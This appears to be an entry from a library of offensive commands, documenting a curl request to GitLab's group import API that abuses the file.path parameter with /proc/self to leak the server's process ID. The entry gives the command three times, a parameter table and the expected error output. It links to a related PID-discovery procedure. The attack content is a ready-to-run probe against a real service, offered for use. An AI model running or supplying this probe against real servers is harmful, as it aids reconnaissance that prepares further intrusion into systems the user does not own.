---
data: >-
  curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt'
  'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
tags:
  - info-leak
type: command
executor: bash
platforms:
  - Web
id: ff8d689a-186b-4f1b-b6ce-aa6f5db31b9c
created_at: '2025-12-11T06:10:15.394Z'
updated_at: '2025-12-11T06:10:15.394Z'
verified: false
validated: true
submitted: true
---
# curl-group-import-pid-leak

## Command

```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
```

## Description

Exploits group import API to leak PID via /proc/self.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $TOKEN_R"` | Auth | Yes |
| `-F 'lala=@/tmp/lala.txt'` | Form | Yes |
| `?file.path=/proc/self` | Leak path | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
```

## Expected Output

{"message":"insecure path used '/proc/9348'"}

## Related

- [[procedures/Discover-Valid-PID-via-Proc-Filesystem-Probing]]
